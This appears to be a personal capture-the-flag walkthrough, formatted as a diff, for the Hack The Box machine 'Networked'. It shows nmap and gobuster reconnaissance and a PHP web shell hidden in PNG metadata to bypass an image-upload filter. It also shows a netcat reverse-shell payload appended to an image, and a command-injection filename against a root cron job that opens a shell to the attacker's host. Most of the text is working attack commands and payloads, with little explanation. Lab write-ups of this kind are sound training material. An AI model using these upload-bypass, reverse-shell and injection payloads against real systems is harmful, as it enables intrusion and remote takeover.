@@ -1,0 +1,148 @@
+kali@kali:~$ nmap -sC -sV 10.10.10.146
+Starting Nmap 7.80 ( https://nmap.org ) at 2020-07-19 21:32 EDT
+Nmap scan report for 10.10.10.146
+Host is up (0.16s latency).
+Not shown: 997 filtered ports
+PORT    STATE  SERVICE VERSION
+22/tcp  open   ssh     OpenSSH 7.4 (protocol 2.0)
+| ssh-hostkey: 
+|   2048 22:75:d7:a7:4f:81:a7:af:52:66:e5:27:44:b1:01:5b (RSA)
+|   256 2d:63:28:fc:a2:99:c7:d4:35:b9:45:9a:4b:38:f9:c8 (ECDSA)
+|_  256 73:cd:a0:5b:84:10:7d:a7:1c:7c:61:1d:f5:54:cf:c4 (ED25519)
+80/tcp  open   http    Apache httpd 2.4.6 ((CentOS) PHP/5.4.16)
+|_http-server-header: Apache/2.4.6 (CentOS) PHP/5.4.16
+|_http-title: Site doesn't have a title (text/html; charset=UTF-8).
+443/tcp closed https
+
+
+
+kali@kali:~$ sudo nmap -sU -sT -T4 --max-retries 0 10.10.10.146
+Starting Nmap 7.80 ( https://nmap.org ) at 2020-07-19 21:33 EDT
+Warning: 10.10.10.146 giving up on port because retransmission cap hit (0).
+Warning: 10.10.10.146 giving up on port because retransmission cap hit (0).
+Nmap scan report for 10.10.10.146
+Host is up (0.16s latency).
+Not shown: 1008 filtered ports, 989 open|filtered ports
+PORT    STATE  SERVICE
+22/tcp  open   ssh
+80/tcp  open   http
+443/tcp closed https
+
+
+kali@kali:~/go/bin$ ./gobuster dir --url=http://10.10.10.146 --wordlist=/usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 30 -x php
+===============================================================
+Gobuster v3.0.1
+by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
+===============================================================
+[+] Url:            http://10.10.10.146
+[+] Threads:        30
+[+] Wordlist:       /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
+[+] Status codes:   200,204,301,302,307,401,403
+[+] User Agent:     gobuster/3.0.1
+[+] Extensions:     php
+[+] Timeout:        10s
+===============================================================
+2020/07/19 21:34:35 Starting gobuster
+===============================================================
+/index.php (Status: 200)
+/uploads (Status: 301)
+/photos.php (Status: 200)
+/upload.php (Status: 200)
+/lib.php (Status: 200)
+/backup (Status: 301)
+
+
+the backup is intersting, it has all the source code :)
+
+alright, we probbaly need to read it
+
+looks like some logic about image upload, use a simply way see if we can put a shell inside it
+
+https://github.com/ldkingvivi/security/blob/master/bypass_image_upload.md
+
+exiftool -Comment='<?php echo "<pre>"; system($_GET['cmd']); ?>' 123.png
+
+rename it as 123.php.png, otherwise it won't run as php
+
+it works we can run command now
+
+and we already know there's /uploads , we just need to use the correct file name
+
+http://10.10.10.146/uploads/10_10_14_29.php.png?cmd=ls%20-al%20/home/guly
+
+
+total 28
+drwxr-xr-x. 2 guly guly 159 Jul  9  2019 .
+drwxr-xr-x. 3 root root  18 Jul  2  2019 ..
+lrwxrwxrwx. 1 root root   9 Jul  2  2019 .bash_history -> /dev/null
+-rw-r--r--. 1 guly guly  18 Oct 30  2018 .bash_logout
+-rw-r--r--. 1 guly guly 193 Oct 30  2018 .bash_profile
+-rw-r--r--. 1 guly guly 231 Oct 30  2018 .bashrc
+-rw-------  1 guly guly 639 Jul  9  2019 .viminfo
+-r--r--r--. 1 root root 782 Oct 30  2018 check_attack.php
+-rw-r--r--  1 root root  44 Oct 30  2018 crontab.gu
+
+
+let's get a reverse shell, seems like we can curl from our own server, wget not exist
+
+once we get it we can rename it as 123.php
+
+.
+..
+10_10_14_29.php.png
+10_10_14_29.png
+123.php
+127_0_0_1.png
+127_0_0_2.png
+127_0_0_3.png
+127_0_0_4.png
+
+now we just need to call that 
+
+10.10.10.146/uploads/123.php
+
+we have a reverse shell now
+
+another way to put php inside png
+
+root@kali:~/Desktop/HTB/boxes/networked# cp original.png ./shell.php.png
+root@kali:~/Desktop/HTB/boxes/networked# echo '<?php' >> ./shell.php.png 
+root@kali:~/Desktop/HTB/boxes/networked# echo 'passthru("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.xx.xx 1337 >/tmp/f");' >> ./shell.php.png 
+root@kali:~/Desktop/HTB/boxes/networked# echo '?>' >> ./shell.php.png 
+root@kali:~/Desktop/HTB/boxes/networked#
+
+
+
+we can't read user.txt , but looks there's a cron and call a file owned by root
+
+looking at that code, there's a intereting command
+
+exec("nohup /bin/rm -f $path$value > /dev/null 2>&1 &");
+
+why rm need to have nohup ????
+
+this literally the hit, the $value is the file name , if we creat a filename a as commnad it will nohup that command
+
+we need to terminiate privious command first
+
+
+touch '; nc 10.10.14.29 1235 -c bash'
+
+wait for 3 mins, as cron
+
+own user
+
+    (root) NOPASSWD: /usr/local/sbin/changename.sh
+
+
+check this script, seems like it read then write our input to a network config file
+
+
+this link shows that if we have space in the middle then it will running input as root
+https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure&qid=e026a0c5f83df4fd532442e1324ffa4f
+
+
+own root
+
+
+
